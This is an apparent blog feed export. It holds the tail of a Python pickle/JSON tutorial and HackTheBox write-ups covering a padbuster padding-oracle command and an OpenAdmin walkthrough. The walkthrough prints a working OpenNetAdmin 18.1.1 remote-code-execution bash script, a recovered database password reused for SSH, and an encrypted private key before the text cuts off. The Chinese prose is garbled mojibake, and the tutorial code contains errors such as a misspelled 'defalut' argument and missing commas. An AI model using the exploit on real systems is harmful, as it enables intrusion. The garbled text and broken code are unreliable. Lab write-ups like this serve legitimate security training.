<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = open(<span class="string">&#x27;dump.txt&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pickle.dump(d, f)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.close()</span><br></pre></td></tr></table></figure>
<p>å½“æˆ‘ä»¬è¦æŠŠå¯¹è±¡ä»ç£ç›˜è¯»åˆ°å†…å­˜æ—¶ï¼Œå¯ä»¥å…ˆæŠŠå†…å®¹è¯»åˆ°ä¸€ä¸ª<code>bytes</code>ï¼Œç„¶åç”¨<code>pickle.loads()</code>æ–¹æ³•ååºåˆ—åŒ–å‡ºå¯¹è±¡ï¼Œä¹Ÿå¯ä»¥ç”¨<code>pickle.load()</code>æ–¹æ³•ç›´æ¥ä»ä¸€ä¸ªfile-like Objectä¸­ç›´æ¥ååºåˆ—åŒ–å‡ºå¯¹è±¡ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = open(<span class="string">&#x27;dump.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = pickle.load(f)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.close()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d</span><br><span class="line">&#123;<span class="string">&#x27;age&#x27;</span>: <span class="number">20</span>, <span class="string">&#x27;score&#x27;</span>: <span class="number">88</span>, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Bob&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>
<h3 id="JSON">JSON</h3>
<p>JSONå’ŒPythonå†…ç½®çš„æ•°æ®ç±»å‹å¯¹åº”å¦‚ä¸‹ï¼š</p>
<table>
<thead>
<tr>
<th style="text-align:left">JSONç±»å‹</th>
<th style="text-align:left">Pythonç±»å‹</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">{}</td>
<td style="text-align:left">dict</td>
</tr>
<tr>
<td style="text-align:left">[]</td>
<td style="text-align:left">list</td>
</tr>
<tr>
<td style="text-align:left">â€œstringâ€</td>
<td style="text-align:left">str</td>
</tr>
<tr>
<td style="text-align:left">1234.56</td>
<td style="text-align:left">intæˆ–float</td>
</tr>
<tr>
<td style="text-align:left">true/false</td>
<td style="text-align:left">True/False</td>
</tr>
<tr>
<td style="text-align:left">null</td>
<td style="text-align:left">None</td>
</tr>
</tbody>
</table>
<p>Pythonå¯¹è±¡â€”&gt;JSONå¯¹è±¡</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> json</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = dict(name=<span class="string">&#x27;Bob&#x27;</span>, age=<span class="number">20</span>, score=<span class="number">88</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>json.dumps(d)</span><br><span class="line"><span class="string">&#x27;&#123;&quot;age&quot;: 20, &quot;score&quot;: 88, &quot;name&quot;: &quot;Bob&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p><code>dumps()</code>æ–¹æ³•è¿”å›ä¸€ä¸ª<code>str</code>ï¼Œå†…å®¹å°±æ˜¯æ ‡å‡†çš„JSONã€‚ç±»ä¼¼çš„ï¼Œ<code>dump()</code>æ–¹æ³•å¯ä»¥ç›´æ¥æŠŠJSONå†™å…¥ä¸€ä¸ªfile-like Objectã€‚</p>
<p>JSONå¯¹è±¡â€”&gt;Pythonå¯¹è±¡</p>
<p>è¦æŠŠJSONååºåˆ—åŒ–ä¸ºPythonå¯¹è±¡ï¼Œç”¨<code>loads()</code>æˆ–è€…å¯¹åº”çš„<code>load()</code>æ–¹æ³•ï¼Œå‰è€…æŠŠJSONçš„å­—ç¬¦ä¸²ååºåˆ—åŒ–ï¼Œåè€…ä»<code>file-like Object</code>ä¸­è¯»å–å­—ç¬¦ä¸²å¹¶ååºåˆ—åŒ–ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>json_str = <span class="string">&#x27;&#123;&quot;age&quot;: 20, &quot;score&quot;: 88, &quot;name&quot;: &quot;Bob&quot;&#125;&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>json.loads(json_str)</span><br><span class="line">&#123;<span class="string">&#x27;age&#x27;</span>: <span class="number">20</span>, <span class="string">&#x27;score&#x27;</span>: <span class="number">88</span>, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Bob&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>
<p>å¦‚æœæƒ³å¯¹ä¸€ä¸ª<code>class</code>å¯¹è±¡è¿›è¡Œåºåˆ—åŒ–æ“ä½œï¼Œæˆ‘ä»¬åº”è¯¥æ€ä¹ˆåšå‘¢ï¼Ÿ</p>
<p><a href="https://docs.python.org/3/library/json.html#json.dumps">https://docs.python.org/3/library/json.html#json.dumps</a></p>
<p>å¯ä»¥çœ‹åˆ°å‚æ•°åˆ—è¡¨ä¸­<code>dumps()</code>çš„å‚æ•°åˆ—è¡¨æä¾›ä¸€ä¸ª<code>default</code>é€‰é¡¹ã€‚</p>
<blockquote>
<p><code>defalut</code>ï¼šTo use a custom <a href="https://docs.python.org/3/library/json.html#json.JSONEncoder">JSONEncoder</a> subclass (e.g. one that overrides the <code>default()</code> method to serialize additional types), specify it with the <em>cls</em> kwarg; otherwise <a href="https://docs.python.org/3/library/json.html#json.JSONEncoder">JSONEncoder</a> is used.</p>
</blockquote>
<p>ä¹Ÿå°±æ˜¯è¯´å¦‚æœè¦åºåˆ—åŒ–ä¸€ä¸ªclasså¯¹è±¡ï¼Œæˆ‘ä»¬å¿…é¡»è‡ªå·±å†™ä¸€ä¸ªåºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œä¸ç„¶Pythonæ˜¯ä¸çŸ¥é“å¦‚ä½•å¯¹ä¸€ä¸ªclasså¯¹è±¡è¿›è¡Œåºåˆ—åŒ–æ“ä½œçš„ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, age, score</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line">        self.score = score</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">student2dict</span>(<span class="params">std</span>):</span></span><br><span class="line">     <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span>: std.name</span><br><span class="line">        <span class="string">&#x27;age&#x27;</span>: std.age</span><br><span class="line">        <span class="string">&#x27;score&#x27;</span>: std.score</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·ï¼Œ<code>Student</code>å®ä¾‹é¦–å…ˆè¢«<code>student2dict()</code>å‡½æ•°è½¬æ¢æˆ<code>dict</code>ï¼Œç„¶åå†è¢«åºåˆ—åŒ–ä¸ºJSONï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = Student(<span class="string">&#x27;Bob&#x27;</span>, <span class="number">20</span>, <span class="number">88</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(json.dumps(s, defalut=student2dict))</span><br><span class="line">&#123;<span class="string">&quot;age&quot;</span>: <span class="number">20</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Bob&quot;</span>, <span class="string">&quot;score&quot;</span>: <span class="number">88</span>&#125;</span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯ä¸ºæ¯ä¸€ä¸ªclasså†™ä¸€ä¸ªç±»ä¼¼è½¬åŒ–å‡½æ•°æœªå…ä»£ç çš„é‡å¤ç‡æœ‰ç‚¹å¤ªé«˜ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(json.dumps(s, default=<span class="keyword">lambda</span> obj: obj.__dict__))</span><br></pre></td></tr></table></figure>
<p>é€šå¸¸<code>class</code>çš„å®ä¾‹éƒ½æœ‰ä¸€ä¸ª<code>__dict__</code>å±æ€§ï¼Œå®ƒå°±æ˜¯ä¸€ä¸ª<code>dict</code>ï¼Œç”¨æ¥å­˜å‚¨å®ä¾‹å˜é‡ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨<code>__dict__</code>å±æ€§ã€‚</p>
<p>å¦‚æœæˆ‘ä»¬è¦æŠŠJSONååºåˆ—åŒ–ä¸ºä¸€ä¸ª<code>Student</code>å¯¹è±¡å®ä¾‹ï¼Œ<code>loads()</code>æ–¹æ³•é¦–å…ˆè½¬æ¢å‡ºä¸€ä¸ª<code>dict</code>å¯¹è±¡ï¼Œç„¶åï¼Œæˆ‘ä»¬ä¼ å…¥çš„<code>object_hook</code>å‡½æ•°è´Ÿè´£æŠŠ<code>dict</code>è½¬æ¢ä¸º<code>Student</code>å®ä¾‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dict2student</span>(<span class="params">d</span>):</span></span><br><span class="line">    <span class="keyword">return</span> Student(d[<span class="string">&#x27;name&#x27;</span>], d[<span class="string">&#x27;age&#x27;</span>], d[<span class="string">&#x27;score&#x27;</span>])</span><br></pre></td></tr></table></figure>
<p>ç»“æœå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>json_str = <span class="string">&#x27;&#123;&quot;age&quot;: 20, &quot;score&quot;: 88, &quot;name&quot;: &quot;Bob&quot;&#125;&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(json.loads(json_str, object_hook=dict2student))</span><br><span class="line">&lt;__main__.Student object at <span class="number">0x10cd3c190</span>&gt;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>ç¼–ç¨‹</category>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>IOç¼–ç¨‹</tag>
      </tags>
  </entry>
  <entry>
    <title>HackTheBox-Challenge-Web</title>
    <url>/Target_drone/HackTheBox/0.HackTheBox-Challenge-Web/</url>
    <content><![CDATA[<h1 id="HackTheBox-Challenge-Web">HackTheBox Challenge Web</h1>
<h2 id="I-know-Mag1k">I know Mag1k</h2>
<p>æ‰“å¼€é¢˜ç›®æœ‰ç™»å½•æ³¨å†Œçš„é¡µé¢ï¼Œå…ˆéšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200715113402.png" alt=""></p>
<p>æœ‰ä¸€ä¸ªcookieå¾ˆå¥‡æ€ªï¼Œæ„Ÿè§‰åƒæ˜¯base64ç¼–ç </p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200715113528.png" alt=""></p>
<p>è¿™ä¸ªåœ°æ–¹å°±æ¶‰åŠåˆ°Padding Oracle attacksï¼ˆå¡«å……æç¤ºæ”»å‡»ï¼‰ï¼Œå¾ˆå¤šå¹´å‰çš„æ”»å‡»æ–¹å¼äº†ï¼Œã€Šç™½å¸½å­è®²webå®‰å…¨ã€‹ä¸­æœ‰æåˆ°è¿‡è¿™ç§æ”»å‡»æ‰‹æ³•ã€‚</p>
<p>ç›´æ¥ä½¿ç”¨å·¥å…·padbusterã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">padbuster http:&#x2F;&#x2F;docker.hackthebox.eu:30921&#x2F;profile.php Y5MXsRyBPFqBPlu3z8p7S2OO%2FGe9sLQ5X1khXeMdHfkcsgbngE3xDA%3D%3D 8 --cookies iknowmag1k&#x3D;Y5MXsRyBPFqBPlu3z8p7S2OO%2FGe9sLQ5X1khXeMdHfkcsgbngE3xDA%3D%3D</span><br></pre></td></tr></table></figure>
<blockquote>
<p>å…¶ä¸­è¿™ä¸ªå‘½ä»¤å‚æ•°8æŒ‡çš„æ˜¯è§£å¯†çš„å—å¤§å°ï¼Œä¸€å…±åªæœ‰ä¸‰ä¸ªå€¼ï¼š8ï¼Œ16ï¼Œ32</p>
</blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB::OpenAdmin Walkthrough</title>
    <url>/Target_drone/HackTheBox/1.HTB-OpenAdmin-walkthrough/</url>
    <content><![CDATA[<h1 id="HTB-OpenAdmin-Walkthrough">HTB::OpenAdmin Walkthrough</h1>
<h2 id="0x01-åŸºæœ¬ä¿¡æ¯">0x01 åŸºæœ¬ä¿¡æ¯</h2>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200207184103.png" alt=""></p>
<h2 id="0x02-ä½¿ç”¨å·¥å…·å’ŒçŸ¥è¯†ç‚¹">0x02 ä½¿ç”¨å·¥å…·å’ŒçŸ¥è¯†ç‚¹</h2>
<ul>
<li>nmap</li>
<li>dirbuster</li>
<li><a href="http://ssh2john.py">ssh2john.py</a></li>
<li>john</li>
<li>opennetadmin v18.1.1 exploit</li>
<li>netstat -tulpn</li>
<li>nano</li>
</ul>
<h2 id="0x03-æ¸—é€æµ‹è¯•è¿‡ç¨‹">0x03 æ¸—é€æµ‹è¯•è¿‡ç¨‹</h2>
<h3 id="ç«¯å£æ¢æµ‹">ç«¯å£æ¢æµ‹</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ca01h:~<span class="comment"># nmap -sC -sV -T5 10.10.10.171</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-07 18:31 HKT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.171</span><br><span class="line">Host is up (0.14s latency).</span><br><span class="line">Not shown: 996 filtered ports</span><br><span class="line">PORT     STATE  SERVICE    VERSION</span><br><span class="line">22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:<span class="built_in">cd</span>:bc:92:00:b7:54 (RSA)</span><br><span class="line">|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)</span><br><span class="line">|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)</span><br><span class="line">80/tcp   open   http       Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">993/tcp  closed imaps</span><br><span class="line">1025/tcp closed NFS-or-IIS</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 76.12 seconds</span><br></pre></td></tr></table></figure>
<p>ç›®æ ‡é¶æœºå¼€æ”¾äº†22 SSHå’Œ80 HTTPç«¯å£ï¼Œå…¶ä¸­80ç«¯å£ä¸Šè¿è¡Œç€ApacheæœåŠ¡ï¼Œæˆ‘ä»¬åœ¨æµè§ˆå™¨ä¸­ç›´æ¥è®¿é—®è¯¥ç«¯å£ï¼Œå‘ç°æ˜¯Apacheçš„é»˜è®¤èµ·å§‹é¡µï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200207184639.png" alt=""></p>
<h3 id="ç›®å½•æ¢æµ‹">ç›®å½•æ¢æµ‹</h3>
<p>ä½¿ç”¨DirBusterå·¥å…·å’ŒKaliè‡ªå¸¦çš„å­—å…¸<code>directory-list-2.3-medium.txt</code>å¯¹ç«™ç‚¹è¿›è¡Œç›®å½•çˆ†ç ´ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200207190909.png" alt=""></p>
<p>DirBusteræš‚æ—¶å°±æ”¾åœ¨åå°ï¼Œç›®å‰çˆ†ç ´å‡ºæ¥çš„ä¸»è¦æ˜¯ä¸¤ä¸ªç›®å½•ï¼š<code>ona</code>å’Œ<code>music</code>ã€‚æˆ‘ä»¬ç›´æ¥å°è¯•<code>http://10.10.10.171/ona/</code>é¡µé¢ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200207201240.png" alt=""></p>
<p>æœ‰ä¸€ä¸ª<code>DOWNLOAD</code>é“¾æ¥ï¼Œç‚¹è¿›å»çœ‹ä¸€ä¸‹ï¼Œå‘ç°æ˜¯OpenNetAdminå®˜ç½‘ï¼Œå¹¶ä¸”å½“å‰çš„ç‰ˆæœ¬å·æ˜¯<code>v18.1.1</code>ã€‚</p>
<blockquote>
<p>OpenNetAdmin is an opensource IP Address Management (IPAM) system.</p>
</blockquote>
<p>ç›´æ¥å»Googleä¸€ä¸‹<code>opennetadmin v18.1.1 exploit</code>ï¼Œå‘ç°ExploitDBåˆ—å‡ºäº†ä¸¤ä¸ªexploitï¼š</p>
<p><a href="https://www.exploit-db.com/exploits/47691">https://www.exploit-db.com/exploits/47691</a></p>
<p><a href="https://www.exploit-db.com/exploits/47772">https://www.exploit-db.com/exploits/47772</a></p>
<h3 id="æ¼æ´åˆ©ç”¨">æ¼æ´åˆ©ç”¨</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution</span></span><br><span class="line"><span class="comment"># Date: 2019-11-19</span></span><br><span class="line"><span class="comment"># Exploit Author: mattpascoe</span></span><br><span class="line"><span class="comment"># Vendor Homepage: http://opennetadmin.com/</span></span><br><span class="line"><span class="comment"># Software Link: https://github.com/opennetadmin/ona</span></span><br><span class="line"><span class="comment"># Version: v18.1.1</span></span><br><span class="line"><span class="comment"># Tested on: Linux</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Exploit Title: OpenNetAdmin v18.1.1 RCE</span></span><br><span class="line"><span class="comment"># Date: 2019-11-19</span></span><br><span class="line"><span class="comment"># Exploit Author: mattpascoe</span></span><br><span class="line"><span class="comment"># Vendor Homepage: http://opennetadmin.com/</span></span><br><span class="line"><span class="comment"># Software Link: https://github.com/opennetadmin/ona</span></span><br><span class="line"><span class="comment"># Version: v18.1.1</span></span><br><span class="line"><span class="comment"># Tested on: Linux</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"> </span><br><span class="line">URL=<span class="string">&quot;<span class="variable">$&#123;1&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>;<span class="keyword">do</span></span><br><span class="line"> <span class="built_in">echo</span> -n <span class="string">&quot;$ &quot;</span>; <span class="built_in">read</span> cmd</span><br><span class="line"> curl --silent -d <span class="string">&quot;xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \&quot;BEGIN\&quot;;<span class="variable">$&#123;cmd&#125;</span>;echo \&quot;END\&quot;&amp;xajaxargs[]=ping&quot;</span> <span class="string">&quot;<span class="variable">$&#123;URL&#125;</span>&quot;</span> | sed -n -e <span class="string">&#x27;/BEGIN/,/END/ p&#x27;</span> | tail -n +2 | head -n -1</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>å°†ä¸Šé¢çš„Bashè„šæœ¬ä¿å­˜åˆ°Kaliï¼Œå¹¶æ‰§è¡Œå‘½ä»¤ï¼Œå¯ä»¥å¾—åˆ°åå¼¹shellï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash ona.sh http://10.10.10.171/ona/</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200209110914.png" alt=""></p>
<p>ç»è¿‡æµ‹è¯•å‘ç°ï¼Œå½“å‰ç”¨æˆ·æ˜¯<code>www-data</code>ï¼Œä¸èƒ½æ‰§è¡Œ<code>cd</code>å‘½ä»¤ç¦»å¼€å½“å‰ç›®å½•ï¼Œç”¨<code>find / -type d -user www-data</code>æŸ¥çœ‹æœ‰æƒé™è®¿é—®çš„ç›®å½•ã€‚</p>
<blockquote>
<ul>
<li>find - is a linux command to find anything like file or directory.</li>
<li>The first argument i.e <code>/</code> is the place to perform the search.</li>
<li><code>-type</code>  - It takes <code>f</code> or <code>d</code> resembling what we are searching.
<ul>
<li><code>f</code> - For files</li>
<li><code>d</code> - For directories</li>
</ul>
</li>
<li><code>-user</code> - This tells in connection to which user. This command will search all the <code>files</code> that have permission for <code>www-data</code> under <code>/</code>(complete file system)</li>
</ul>
</blockquote>
<p>å†…å®¹å¤ªå¤šè¿™é‡Œå°±ä¸è´´ç»“æœäº†ï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯<code>/opt/ona/www/</code>å’Œ<code>/var/www/ona/</code>ä¸¤ä¸ªç›®å½•ï¼Œé¦–å…ˆå»çœ‹<code>config</code>é…ç½®æ–‡ä»¶ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200209112555.png" alt=""></p>
<p>æŸ¥çœ‹<code>config.inc.php</code>ï¼Œå‘ç°æœ‰ä¸€ä¸ªæ•°æ®åº“çš„é…ç½®æ–‡ä»¶ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Include the localized Database settings</span></span><br><span class="line">$dbconffile = <span class="string">&quot;<span class="subst">&#123;$base&#125;</span>/local/config/database_settings.inc.php&quot;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200209114426.png" alt=""></p>
<p>æ‰¾åˆ°äº†mysqlçš„ç™»å½•ç”¨æˆ·å¯†ç ï¼š<code>n1nj4W4rri0R!</code>ï¼Œå†çœ‹ä¸€ä¸‹<code>/var/www/</code>ç›®å½•ï¼Œå‘ç°æœ‰ä¸€ä¸ª<code>internal</code>ç›®å½•å±äºJimmyç”¨æˆ·ï¼Œç”¨Jimmyå’Œmysqlçš„å¯†ç ç™»å½•SSHã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jimmy@openadmin:~$ <span class="built_in">cd</span> /var/www/internal</span><br><span class="line">jimmy@openadmin:/var/www/internal$ ls -la</span><br><span class="line">total 20</span><br><span class="line">drwxrwx--- 2 jimmy internal 4096 Nov 23 17:43 .</span><br><span class="line">drwxr-xr-x 4 root  root     4096 Nov 22 18:15 ..</span><br><span class="line">-rwxrwxr-x 1 jimmy internal 3229 Nov 22 23:24 index.php</span><br><span class="line">-rwxrwxr-x 1 jimmy internal  185 Nov 23 16:37 logout.php</span><br><span class="line">-rwxrwxr-x 1 jimmy internal  339 Nov 23 17:40 main.php</span><br><span class="line">jimmy@openadmin:/var/www/internal$ cat main.php</span><br><span class="line">&lt;?php session_start(); <span class="keyword">if</span> (!isset (<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])) &#123; header(<span class="string">&quot;Location: /index.php&quot;</span>); &#125;; </span><br><span class="line"><span class="comment"># Open Admin Trusted</span></span><br><span class="line"><span class="comment"># OpenAdmin</span></span><br><span class="line"><span class="variable">$output</span> = shell_exec(<span class="string">&#x27;cat /home/joanna/.ssh/id_rsa&#x27;</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="variable">$output</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;h3&gt;Don<span class="string">&#x27;t forget your &quot;ninja&quot; password&lt;/h3&gt;</span></span><br><span class="line"><span class="string">Click here to logout &lt;a href=&quot;logout.php&quot; tite = &quot;Logout&quot;&gt;Session</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>mian.php</code>æ–‡ä»¶æç¤ºé€šè¿‡ç™»å½•è®¤è¯jimmyç”¨æˆ·è¾“å‡ºå¦ä¸€ä¸ªç”¨æˆ·joannaçš„rsaå¯†é’¥ï¼Œç°åœ¨æˆ‘ä»¬å°±éœ€è¦çŸ¥é“ï¼Œè¿™ä¸ªæœåŠ¡è¿è¡Œåœ¨å“ªä¸ªç«¯å£ä¸Š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jimmy@openadmin:~$ curl http://localhost/main.php</span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">&quot;-//IETF//DTD HTML 2.0//EN&quot;</span>&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">&lt;title&gt;404 Not Found&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Not Found&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;address&gt;Apache/2.4.29 (Ubuntu) Server at localhost Port 80&lt;/address&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ä¸æ˜¯æ™®é€šçš„80ç«¯å£ï¼Œè¿è¡Œ<code>netstat -tulpn</code>å‘½ä»¤ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">immy@openadmin:~$ netstat -tulpn</span><br><span class="line">(Not all processes could be identified, non-owned process info</span><br><span class="line"> will not be shown, you would have to be root to see it all.)</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      -                   </span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      -                   </span><br><span class="line">udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>åˆ—å‡ºæ¥çš„ç«¯å£ä¸­æœ€æœ‰å¯èƒ½çš„å°±æ˜¯52846ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url http:&#x2F;&#x2F;localhost:52846&#x2F;main.php</span><br><span class="line">&lt;pre&gt;-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D</span><br><span class="line"></span><br><span class="line">kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8</span><br><span class="line">ad&#x2F;StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO</span><br><span class="line">ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE</span><br><span class="line">6xaubNKhDJKs&#x2F;6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ</span><br><span class="line">ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5&#x2F;Du</span><br><span class="line">y8byJ&#x2F;3I3&#x2F;EsqHphIHgD3UfvHy9naXc&#x2F;nLUup7s0+WAZ4AUx&#x2F;MJnJV2nN8o69JyI</span><br><span class="line">9z7V9E4q&#x2F;aKCh&#x2F;xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4</span><br><span class="line">piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv&#x2F;dEVEppvIDE&#x2F;8h&#x2F;</span><br><span class="line">&#x2F;U1cPvX9Aci0EUys3naB6pVW8i&#x2F;IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH</span><br><span class="line">40ZNca5xHPij8hvUR2v5jGM&#x2F;8bvr&#x2F;7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN&#x2F;AZ</span><br><span class="line">fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb</span><br><span class="line">9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80</span><br><span class="line">X1VZ+N7S8ZP+7djB22vQ+&#x2F;pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg</span><br><span 